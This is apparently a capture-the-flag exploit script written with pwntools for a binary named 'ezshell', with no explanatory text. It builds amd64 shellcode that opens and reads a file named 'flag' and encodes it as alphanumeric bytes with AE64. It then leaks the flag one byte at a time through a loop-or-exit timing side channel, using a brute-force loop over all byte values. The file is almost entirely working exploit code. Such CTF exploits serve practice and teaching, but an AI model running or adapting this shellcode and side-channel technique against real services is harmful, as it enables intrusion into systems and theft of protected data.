from pwn import *
from ae64 import AE64

# p = remote("8.140.177.7", 40334)
context(os="linux", arch="amd64")
#context.log_level = "debug"
context.terminal= ['tmux','splitw','-h']
map_addr = 0x10000
flag_addr = 0x10100

def exp(offset, ch):
    code = asm(
        """
        push 0x67616c66
        mov rdi, rsp
        xor edx, edx
        xor esi, esi

        push SYS_open
        pop rax
        syscall
        push SYS_open
        pop rax
        syscall
        push SYS_open
        pop rax
        syscall
        push SYS_open
        pop rax
        syscall

        xor eax, eax
        push 6
        pop rdi
        push 0x50
        pop rdx
        mov rsi, 0x10100
        syscall

        mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl, dl
        jz loop
        mov al,231
        syscall
        loop:
        jmp loop

        """.format(offset, ch)
    )
    obj = AE64()
    sc = obj.encode(code,'rdx')
    # print sc
    p.recvuntil("Are you a master of shellcode?\n")
    p.send(sc)
    # p.interactive()



flag = ""
for i in range(len(flag),50):
    sleep(1)
    log.success("flag : {}".format(flag))
    for j in range(0x100):
        p = process('./ezshell')
        try:
            exp(i,j)
            p.recvline(timeout=1)
            flag += chr(j)
            p.send('\n')
            log.success("{} pos : {} success".format(i,chr(j)))
            log.success(flag)
            p.close()
            break
        except:
            p.close()

